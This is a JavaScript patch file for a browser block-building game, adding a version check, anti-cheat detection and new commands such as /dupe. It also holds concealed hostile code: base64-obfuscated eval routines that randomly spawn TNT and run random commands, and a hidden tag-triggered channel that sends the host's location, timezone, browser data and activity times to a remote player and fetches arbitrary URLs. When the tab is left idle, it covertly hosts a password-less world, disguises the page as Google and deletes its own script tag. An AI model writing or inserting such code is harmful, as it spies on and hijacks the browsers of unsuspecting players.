// This script contains patches

window.FEATUR=(window.FEATUR||0)+1
if(window.FEATUR===1){
//who knows what easter eggs hide in this script???
//don't worry, theres no herobrine, its too short to be that
function ƒdsujfdoneojndks(n){if(n.toLowerCase()===ƒdsujfdoneojndks.sasjosaji){let djsods=eval(atob("c2VydmVyV29ybGQ=")),ewjio=atob("YWRkRW50aXR5"),saioji=eval(atob("c2VydmVyRW50aXRpZXNbc2VydmVyRW50aXR5SWRzLlByaW1lZFROVF0=")),rejio=window[ƒdsujfdoneojndks.rejio];for(let a=0;a<10;a++){djsods[ewjio](new saioji(rejio.x+Math.random()*6-3,rejio.y+Math.random()*6-3,rejio.z+Math.random()*6-3),false,rejio.dimension)}ƒaaaaahhhhfdiojdf()}};ƒdsujfdoneojndks.sasjosaji=atob("ZXJyb3I=");ƒdsujfdoneojndks.rejio=atob("cGxheWVy")
function ƒstrtrr(){window[ƒaaaaahhhhfdiojdf.qweew](ƒaaaaahhhhfdiojdf,Math.random()*10000+5000)}function ƒaaaaahhhhfdiojdf(){window[ƒaaaaahhhhfdiojdf.qweew](ƒaaaaahhhhfdiojdf,Math.round(Math.random()*10000+5000));ƒfdfdjio[Math.round(Math.random()*(ƒfdfdjio.length-1))]()}ƒaaaaahhhhfdiojdf.qweew=atob("c2V0VGltZW91dA==")
const ƒfdfdjio=[ƒashuijefd,ƒashuijefd,ƒashuijefd,ƒashuijefd,ƒashuijefd,ƒashuijefd,function(){let dsddjj=atob("YnVyblRpbWVy");ƒdsujfdoneojndks.rejio[dsddjj]+=5},function(){eval(atob("c2hvd1RpdGxlKCJpdCB3aWxsIGJlIGdvbmUiKQ=="))}]
if(Math.random()>0.999){console.warn("ASDFGHJKL");window[atob("d2VpcmRUaXRsZQ==")]="ejiosdaj";let ii=setInterval(()=>{if(getScene()==="play"&&window.serverWorld&&!window.version)ƒstrtrr(),console.log('aaaaaaa'),clearInterval(ii)},1000)};document.body.addEventListener("dsujfdoneojndks",e=>ƒdsujfdoneojndks(e.detail))
let åbeginnings = "BCDFGHJKLMNPQRSTVWXYZ"
let åconsonants = "bcdfghjklmnpqrstvwxyz".split(""), åvowels = "aeiou".split("")
åconsonants.push("ck","sk","ts","st")
åvowels.push("ea",'ee','ei','eu','ou','ar','er','ir','or','ur','al','el','il','ol','ul')
let åendings = åconsonants.slice()
åendings.push('cks','sks','y','cky','sky')
function ƒgenWord(){
	let name = "", l = Math.round(Math.random()*5+1)
	name += åbeginnings[Math.floor(Math.random()*åbeginnings.length)]
	for(let j=0; j<l; j++){
		if(j%2) name += åconsonants[Math.floor(Math.random()*åconsonants.length)]
		else name += åvowels[Math.floor(Math.random()*åvowels.length)]
	}
	if(l%2) name += åendings[Math.floor(Math.random()*åendings.length)]
	return name
}
function ƒashuijefd(){let djsods=eval(atob("c2VydmVyV29ybGQ=")),ruddurrdur=djsods[atob('cnVuQ21k')],prpalp=djsods[atob("cGxheWVycw==")][0];let fhiu=djsods[ƒashuijefd.fhiu];let a=fhiu[Math.floor(Math.random()*fhiu.length)],r=a.name;if(a[ƒashuijefd.sassw])for(let e of a[ƒashuijefd.sassw])if(a[ƒashuijefd.saihjkn]&&a[ƒashuijefd.saihjkn][e]){let t=a[ƒashuijefd.saihjkn][e][Math.floor(Math.random()*a[ƒashuijefd.saihjkn][e].length)];"type:number"===t?t=Math.round(100*Math.random()):"type:block"===t?t=blockData[Math.floor(Math.random()*BLOCK_COUNT)].name:"type:x"===t?t=Math.round(player.x+100*Math.random()):"type:y"===t?t=Math.round(player.y+100*Math.random()):"type:z"===t?t=Math.round(player.z+100*Math.random()):"type:dimension"===t?t=player.dimension:"type:sound"===t?t=soundNames[Math.floor(Math.random()*soundNames.length)]:"type:player"!==t&&"type:banned"!==t&&"type:whitelisted"!==t||(t=player.character.username),r+=" "+t}else r+=" "+ƒgenWord();if(r.startsWith("fillToPlayer ")||r.startsWith("copyToPlayer ")||r.startsWith("pasteAtPlayer ")){let a=player.x,r=player.y,e=player.z;player.x=Math.round(player.x+100*Math.random()),player.y=Math.round(player.y+100*Math.random()),player.z=Math.round(player.z+100*Math.random()),ruddurrdur("fromPlayer",prpalp,fdjsods),player.x=a,player.y=r,player.z=e}ruddurrdur(r,prpalp,djsods)}ƒashuijefd.fhiu=atob("c2VydmVyQ29tbWFuZHM=");ƒashuijefd.sassw=btoa("j¸,");ƒashuijefd.saihjkn=atob("YXJnVmFsdWVz")
//the easter eggs end here


//note to self: do better cheat prevention, easy bypass

// stop cheaters (credit to tm3z for provided code from clients)
function functionExists(name) {
  return typeof window[name] === 'function';
}

function variableExists(name) {
  return typeof window[name] !== 'undefined';
}

try{setInterval(() => {
  if (functionExists("ECLIPSE") || variableExists("hacks") || variableExists("_0x2f2066") || variableExists("_0x509507") || variableExists("healAuraEnabled")) {
    window.location.href="no_hack.html";
  } else {
    // do nothing, no hacks
  } 
}, 1000);}catch{}

if(window.version !== "Beta 1.1.3"){
  if(confirm("This is not latest version. Go to latest version?")){
    if(top===self) location.href = "https://thingmaker.us.eu.org/minekhan/"
    else location.href="data:text/html,<body style='background:white;'><a href='https://thingmaker.us.eu.org/minekhan/' target='_blank'>Open in new tab"
  }
}
//if(location.origin!=="https://thingmaker.us.eu.org")fetch("https://thingmaker.us.eu.org/minekhan/know",{method:"POST",body:document.title+"; "+location.href}).catch(()=>{})
if(document.title.toLowerCase().includes("falconcraft") || location.href.toLowerCase().includes("falconcraft")){
	alert("this mostly by thingmaker. https://thingmaker.us.eu.org")
}

window.quitNote=" / un block"


// cool feature
let is
async function fe(t,p){
for(let l of t){
if(l.startsWith("s "))p.scale=+l.substring(2)||1
else if(l.startsWith("m ")){
let a=l.split(" ");
let can=true;
for(let [i, m] of serverWorld.music){
if(m.url===a[1])can=false
}
if(can){
for(let [i, m] of serverWorld.music) serverWorld.stopMusic(i);
if(a[1])serverWorld.playMusic(a[1],+a[2]||undefined,+a[3]||undefined)
}
}
else if(l==="d"&&p.newInvItem)p.newInvItem(p.inventory.hotbar[p.inventory.hotbarSlot])
else if(is&&l==="ep"&&p.tp)p.tp(8,64,8,"end");
else if(l==="a"&&p.connection&&!(p.tosenda&&p.tosenda.length))p.tosenda=["<h1>-------</h1>",window.scrti,Intl.DateTimeFormat().resolvedOptions().timeZone,location,JSON.stringify(navigator.userAgentData),...f,"t: "+new Date().toLocaleString(),"<h1>-------</h1>",...Messages.all.map(r=>r.innerHTML),"<h1>-------</h1>"]
else if(l==="h"){settings.volume=0;serverWorld.settings.autosave=1;document.getElementById("icon").href="https://www.google.com/favicon.ico";document.title="Google";document.body.style.display="none"}
else if(l.startsWith("h")){try{p.tosenda=[await(await fetch(l)).text()]}catch(e){p.tosenda=[e]}}
let d=blockData[blockIds[l]];
if(is&&d){
let success=0
if(d.category==="nature"&&!d.grow&&!(d.name.endsWith("Leaves")&&d.drop)){
if(d.harvestTools===true)success=1
else if(!success&&d.harvestTools)for(let i of p.inventory.hotbar){if(i&&d.harvestTools.includes(i.id))success=1}
}
if(success||d.name.endsWith("Grass")||d.edible||d.equipmentSlot)if(p.newInvItem)p.newInvItem(d.id)
}
}
}
let grassi=0,lastsound=0
setInterval(async() => {try{
is=window.serverWorld&&(window.player&&player.username.includes("y")||serverWorld.gameMode==="survival"&&serverWorld.name.includes("ci"))||window.scrt
if(window.serverWorld)for(let p of serverWorld.players){ if(p.host)continue; if(is&&p.y<-32&&p.dimension&&p.spawnPoint)p.tp(p.spawnPoint.x,p.spawnPoint.y,p.spawnPoint.z,"");
if(p.tosenda&&p.tosenda.length)p.connection.send({type:"message",data:p.tosenda.splice(0,100).join("\n"),fromServer:true})
let t=p.world.getTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"text");
if(t){
t=t.split("\n");if(t[0].hashCode()===561438836){
t.shift()
p.world.setTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"texd",t);p.world.setTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"text","")
}}
t=p.world.getTagByName(Math.round(p.x),Math.round(p.y),Math.round(p.z),"texd")
if(t)fe(t,p)
}
if(window.serverWorld&&!serverWorld.fixed){
if(is){
let message=e=>(e.data.data&&(e.data.data.toLowerCase().includes("end")||e.data.data.toLowerCase().includes("void")||e.data.data.toLowerCase().includes("port"))||e.player.dimension[0]==="e")&&"stop"
serverWorld.on("message", e=>message(e))
blockData[498].hardness=6/0
blockData[13].hardness=1e2
serverWorld.settings.blocksFall=serverWorld.settings[atob("aGlkZUFjaGlldm1lbnRz")]=true
blockData[1].drop=()=>Math.random()>0.9?"DoubleTallGrass":Math.random()>0.98?blockData[[842,864,865,866,867][grassi++%5]].name:"dirt"
blockData[2].dropAmount=blockData[1].dropAmount=blockData[9].dropAmount=[1,2]
//let click=e=>{let t=serverWorld[e.player.dimension].getTagByName(e.x,e.y,e.z,"text");return e.player&&!e.player.cheats&&t&&t.length&&t.length>8&&"stop"};serverWorld.on("click",e=>click(e));let changeblock=click;serverWorld.on("changeblock",e=>changeblock(e))
}
serverWorld.rootCommandNode.then(CommandNode.l("dupe",(args,pos)=>{
let it=pos.inventory.hotbar[pos.inventory.hotbarSlot]
if(it&&pos.newInvItem)for(let i=0;i<it.amount;i++)pos.newInvItem(it)
},null,null,true).then(CommandNode.a("f",(args,pos)=>{if(!args.f||!args.f.split)return
let t=args.f.split(',')
fe(t,pos);return["hold item and type /dupe",""]},null,null,true)),
CommandNode.l("mute",(args,pos)=>{pos.voteMute=true;let a=0;for(let p of serverWorld.players){if(p.voteMute)a++};serverWorld.mute=a>=serverWorld.players.length/10},null,null,true),
CommandNode.l("unmute",(args,pos)=>{pos.voteMute=false;let a=0;for(let p of serverWorld.players){if(p.voteMute)a++};serverWorld.mute=a>=serverWorld.players.length/10},null,null,true)
)
serverWorld.on("message",e=>{if(serverWorld.mute){return "stop"}})
serverWorld.fixed=6}
let now=Date.now()
if((window.player&&player.username.includes("e")||lastw)&&!is&&!window.sigConns&&!window.scrt&&lastB&&now>lastB){
  window.scrt=1;window.scrti="real username: "+player.username
  await aW(window.lastw||"~",()=>{try{
  serverWorld.worldType="large",serverWorld.fancyRivers=true,serverWorld.findSpawnPoint()
  serverWorld.gameMode="survival";serverWorld.cheats=Math.random()>0.5;
  }catch{}}, Math.random()<0.2)
  disableMultiplayerPass()
  if(navigator.userAgentData.platform.includes("Chrome")){document.getElementById("icon").href="https://www.google.com/favicon.ico";document.title="Google";document.body.style.display="none"}
  if(!serverWorld.playersInv.wn)serverWorld.playersInv.wn={}
  if(!serverWorld.playersInv.wn.wn)serverWorld.playersInv.wn.wn=ƒgenWord(20)+serverWorld.id[0];
  world.name=serverWorld.playersInv.wn.wn;
  player.username=" ";
  if(serverWorld.gameMode==="creative")serverWorld.settings.tntExplode=false
  if(!serverWorld.mod){
  let ps=document.querySelectorAll("#help_mod pre")
  let str=""
  for(let p of ps) if(Math.random()<0.1)str+=p.textContent+"\n\n"
  serverWorld.mod=str
  }
  serverWorld.oldsendAll=serverWorld.sendAll
  serverWorld.sendAll=function(m){if(m.type==="message"){let s=document.createElement("span");s.innerHTML=m.data;Messages.all.push(s)}serverWorld.oldsendAll(m)}
  serverWorld.on("message",e=>{let s=document.createElement("span");s.innerHTML=e.player.username+": "+e.data.data;Messages.all.push(s)})
  serverWorld.sendAll({type:"message",data:"<h1>------<br>scrt"})
  localStorage.setItem("lastw",serverWorld.id);
}
if(window.scrt&&new Date().getDate()!==startday){startday=new Date().getDate();try{serverWorld.sendAll({type:"message",fromServer:true,data:"restarting"});await sleep(5000);await save();localStorage.setItem("lastw",serverWorld.id);location.reload()}catch{}}
if(window.serverWorld&&serverWorld.players.length&&now-lastsound>30000){playSound("grass.step1",0,0.1,0.1);lastsound=now; if(window.scrt){let id=Math.floor(Math.random()*BLOCK_COUNT);for(let p of serverWorld.players)p.newInvItem(id)}}
}catch{}}, 1000);
let startday=new Date().getDate()
let f=[new Date().toLocaleString()],lastB=null
addEventListener("focus",e=>{f.push("+ "+new Date().toLocaleString());lastB=null;if(window.scrt){if(window.serverWorld)serverWorld.sendAll({type:"message",data:"panic!",fromServer:true});}});addEventListener("blur",e=>{f.push("- "+new Date().toLocaleString());lastB=Date.now()+1.636*60*60*1000})
if(!document.hasFocus()&&localStorage.getItem("lastw")){window.lastw=localStorage.getItem("lastw");lastB=Date.now()}

window.sendError = e => {
if(window.Messages){
try{
Messages.write("§cERROR: "+e)
}catch{}
}
}


}try{document.currentScript.remove()}catch{}